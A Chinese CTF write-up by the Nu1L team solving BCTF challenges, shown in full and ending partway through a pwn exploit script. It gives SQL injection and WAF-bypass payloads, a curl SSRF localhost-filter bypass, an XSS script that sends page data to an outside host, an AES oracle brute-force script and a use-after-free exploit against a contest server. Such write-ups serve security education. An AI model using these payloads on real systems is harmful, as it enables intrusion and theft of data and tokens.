# 【CTF 攻略】第三届XCTF——北京站BCTF第一名战队Writeup
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
**  
**
****
作者：[Veneno@Nu1L](http://bobao.360.cn/member/contribute?uid=1490911994)
预估稿费：500RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**Misc**
**签到：**
Nc连上去输入token，得到flag。
**foolme**
**关键点1：** 哈希碰撞得到md5值结尾相同的key.使用穷举方法即可。
**关键点2：** 发送满足条件的jpg图片的数据。校验函数是check。
直接修改可以影响diff值的数据即可，即input_x,input_y,input_z的值。不断修改像素值，将diff值调高，但是不可以大于2，并且被识别引擎识别为与原图不同的图片。
**Web**
**signature**
Github搜索源码。很容易搜到源码，下载后进行分析：
很容易看出是CI写的一个Demo站点。
在blog_backup_2014.php中很容易发现：
成功登陆后，在admin页面处发现注入：
发现经过了waf处理…但是出题人给的源码里把waf函数已经抽空，黑盒fuzz后发现貌似只过滤了空格，用括号绕过即可，注入得到最终的表结构，然后发现flag在payment.php中：
读取数据，然后构造signature，post得到最终flag。(忘记截图…
PS：题目注入的时候服务器反应的确有点慢，不如将数据库的结构在源码中有所体现，可能会增加选手的做题快感XD。
**baby sqli**
首先输入admin'#绕过登陆，提示有4个item，一个一个的买，买到d拿到flag：
    bctf{8572160a2bc7743ad02b539f74c24917}
**Kitty shop**
题目接着刚才的做，有一个可以下载manual的地方，fuzz发现存在任意文件下载：
Fuzz目录：
得到一个地址/app/encrypt0p@ssword/passwor：
访问 ：
利用kaiity的任意文件下载拿到client的elf文件。如图sub_401B6A函数中调用了recv函数接受服务器数据，
对recv函数下断分析接收的数据得到如下图所示的内容：
**Paint**
涉及两个知识点，一个curl的拼接访问，一个是127.0.0.1呗过滤之后的绕过，curl可以拼接访问，curl
http://a.com/{a.gif,b.gif},还有就是127.0.0.1被过滤之后的绕过，可以用127.0.0.2绕过。我们首先将一张图片切成2分，中间差距正好应该是flag.php的请求大小。首先在地址那里输入http://127.0.0.2/flag.php获知大小是374字节，之后用我们的脚本切割图片，上传
之后在地址那里输入
[http://127.0.0.2/{uploads/1492269999HkwuqBYX.gif,flag.php,uploads/1492270040evG9tmYw.gif}](http://127.0.0.2/%7Buploads/1492269999HkwuqBYX.gif,flag.php,uploads/1492270040evG9tmYw.gif%7D)
得到新的图片：
访问就是flag
> 后来我发现其实只要切割大小小于374都可以拿到flag，原因不详
    file1 = open('a.gif', 'r')
    data = file1.read()
    i1 = data[:200]
    i2 = data[573:]
    f1 = open("1.gif", "w")
    f1.write(i1)
    f1.close()
    f2 = open("2.gif", "w")
    f2.write(i2)
    f2.close()
    Only admin
首先是登陆，忘记密码那里，输入用户名admin和随便一个邮箱，查看源码有一个md5，解开就是admin的密码，登陆，发现存在cookie，解开是user的md5，修改成admin的md5，拿到一个github的用户，访问上去，有一个apk，反编译一下，解密就好。有点扯淡的题目，不解释
    import java.util.Base64;
    import javax.crypto.Cipher;
    import javax.crypto.spec.SecretKeySpec;
    public class MyTest {
    public static void main(String[] args) throws Exception {
    SecretKeySpec key = new SecretKeySpec("3742#AES$$JKL:cn".getBytes(), "AES");
    Cipher v0 = Cipher.getInstance("AES/ECB/PKCS5Padding");
            v0.init(2, key);
            byte[] b = null;
            b = Base64.getDecoder().decode("+ipteaf41bn/76A25zWVDwgc7x5vOtBFHDrBpg9NSTw=");
            System.out.println(new String(v0.doFinal(b)));
    }
    }
**Alice and Bob**
基于语义的waf,
引入能够打乱语义判断的就可以触发到了
mysql 有 mod 的比较符和函数
想着通过引入两个去打乱语义
    payload:  'mod mod(1,1) union select flag from flag#
**Diary**
跟uber的案例差不多：
题目一看就是xss的，认证过程是Oauth，直接那这个网址上面的payload就可以复现，一共三个文件
    > http://xss.xxx.cn/attack/albert2.js
    > http://xss.xxx.cn/attack/index.html
    > http://xss.xxx.cn/attack/login-target.html
    var loginIframe = document.createElement('iframe');
    loginIframe.setAttribute('src', 'http://xss.albertchang.cn/attack/login-target.html');
    top.document.body.appendChild(loginIframe);
    setTimeout(function() {
    //document.cookie = "csrftoken=cQmHtL1l4LyBPq8eg5yp9Sf6JrZrkqdiySkSf36veE13JypisP4YKOyEjKywR96F;domain=*.xctf.org.cn;path=/";
    //console.log(document.cookie['csrftoekn']);
    //cookie动态获取，本来想着直接写死的，但是没有成功,本层只有一个cookie是csrftoken，直接取出来就好
    var token= document.cookie.split('=')[1];
    console.log(token);
    $.post("http://diary.bctf.xctf.org.cn/survey/",
    {rate:'1',suggestion:'albertchang',csrfmiddlewaretoken:token},
    function (data){
    $.get("http://xss.albertchang.cn/?data="+escape(data));
    }
    );}
    , 9000);
**Crypto**
**Hulk:**
首先测试发现flag应该是38位，因为输入9个字符和10个字符明显多出来一组，所以根据拼接方式可以知道应该是38位
    #!/usr/bin/env python
    # encoding: utf-8
    from zio import *
    flag = ''
    target = ('202.112.51.217',9999)
    dic = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}"
    def get_payload(a, b, c):
        return ''.join(chr(ord(a[i]) ^ ord(b[i]) ^ ord(c[i])) for i in xrange(16))
    def exp(i, payload):
        io = zio(target, timeout=5, print_read = COLORED(NONE, 'red'), print_write = COLORED(NONE, 'green'))
        io.read_until('encrypt: 0x')
        pay1 = '30' * (48-i)
        io.writeline(pay1)
        io.read_until('ciphertext')
        data = io.read_until('Give')
        io.read_until('encrypt: 0x')
        ciphertext1 = data[data.find('0x')+2:-5]
        data1 = ciphertext1[64:96]
        tmp = ('0' * (39 - len(flag + payload)) + flag + payload)[-16:]
        pay2 = get_payload(ciphertext1[32:64].decode('hex'), ciphertext1[-32:].decode('hex'), tmp).encode('hex')
        io.writeline(pay2)
        io.read_until("ciphertext")
        r2 = io.read_until("n")
        ciphertext12 = r2[r2.find('0x')+2:r2.find('0x')+34]
        io.close()
        if data1 == ciphertext12:
            return 1
        else :
            return 0
    for i in xrange(1, 39):
        for pay in dic:
            if exp(i, pay):
                flag += pay
                print flag
                break
    print flag
**Pwn**
**Babyuse (PWN)**
select之后drop会导致use时uaf，泄露堆上地址和vtable然后伪造vtable可以执行任意代码。
脚本：
    #!/usr/bin/env python2
    # -*- coding:utf-8 -*-    from pwn import *
    import os, sys
    #r = process("./babyuse")
    token = '4e4ARInVS102IeYFkmUlBUVjOojxsMKC'
    r = remote('202.112.51.247', 3456)
    context(log_level='DEBUG')
    def ru(delim):
        return r.recvuntil(delim)
    def rn(c):
        return r.recvn(c)
    def sn(d):
        return r.send(d)
    def sl(d):
        return r.sendline(d)
    def menu():